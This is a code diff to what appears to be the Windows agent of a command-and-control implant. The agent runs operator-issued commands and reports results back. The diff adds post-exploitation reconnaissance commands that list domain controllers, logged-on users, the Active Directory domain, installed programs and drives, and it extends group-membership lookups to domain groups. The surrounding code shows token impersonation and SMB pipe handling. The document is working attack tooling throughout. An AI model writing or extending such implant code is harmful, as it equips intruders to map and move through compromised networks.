@@ -36,6 +36,11 @@ if os.name == 'nt':  # 'nt' indicates Windows
     from utils.winapi.cd import cd
     from utils.winapi.ipinfo import get_ip_info
     from utils.winapi.make_token import make_token, revert_to_self
+    from utils.winapi.get_ad_domain import get_ad_domain
+    from utils.winapi.get_domain_controllers import get_domain_controllers
+    from utils.winapi.get_logged_on_users import get_logged_on_users
+    from utils.winapi.get_drive_info import get_drive_info
+    from utils.winapi.get_installed_programs import get_installed_programs
 
 logging.basicConfig(level=logging.INFO)
 smb_pipe_conn = None
@@ -188,6 +193,16 @@ def execute_commands():
                     output = str(e)
                 update_command_status(command_id, status, output, hostname, ip, os_info, username)
 
+            elif os.name == 'nt' and command_text.lower() == 'get_dc_list':
+                try:
+                    result = get_domain_controllers()
+                    status = 'Completed'
+                    output = "\n".join(result)
+                except Exception as e:
+                    status = 'Failed'
+                    output = str(e)
+                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+
             elif os.name == 'nt' and command_text.lower().startswith('rm'):
                 try:
                     path = command_text.split(' ', 1)[1]
@@ -205,6 +220,46 @@ def execute_commands():
                     result = mkdir(path)
                     status = 'Completed'
                     output = result
+                except Exception as e:
+                    status = 'Failed'
+                    output = str(e)
+                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+
+            elif os.name == 'nt' and command_text.lower() == 'get_logged_on_users':
+                try:
+                    result = get_logged_on_users()
+                    status = 'Completed'
+                    output = "\n".join(result)
+                except Exception as e:
+                    status = 'Failed'
+                    output = str(e)
+                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+
+            elif os.name == 'nt' and command_text.lower() == 'get_ad_domain':
+                try:
+                    result = get_ad_domain()
+                    status = 'Completed'
+                    output = result
+                except Exception as e:
+                    status = 'Failed'
+                    output = str(e)
+                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+
+            elif os.name == 'nt' and command_text.lower() == 'get_installed_programs':
+                try:
+                    result = get_installed_programs()
+                    status = 'Completed'
+                    output = "\n".join(result)
+                except Exception as e:
+                    status = 'Failed'
+                    output = str(e)
+                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+
+            elif os.name == 'nt' and command_text.lower() == 'get_drive_info':
+                try:
+                    result = get_drive_info()
+                    status = 'Completed'
+                    output = "\n".join(result)
                 except Exception as e:
                     status = 'Failed'
                     output = str(e)
@@ -373,14 +428,19 @@ def execute_commands():
 
             elif os.name == 'nt' and command_text.lower().startswith('users '):
                 try:
-                    group_name = command_text.split(' ', 1)[1]
-                    result = list_users_in_group(group_name)
+                    parts = command_text.split(' ', 2)
+                    if len(parts) < 3:
+                        raise ValueError("Invalid users command format. Use 'users <local|dom> <group_name>'.")
+                    group_type, group_name = parts[1], parts[2]
+                    logging.info(f"Parsed group_type: {group_type}, group_name: {group_name}")
+                    result = list_users_in_group(group_type, group_name)
                     status = 'Completed'
                     output = "\n".join(result)
                 except Exception as e:
                     status = 'Failed'
                     output = str(e)
                 update_command_status(command_id, status, output, hostname, ip, os_info, username)
+
 
             elif os.name == 'nt' and command_text.lower().startswith('smb write '):
                 parts = command_text.split(' ')
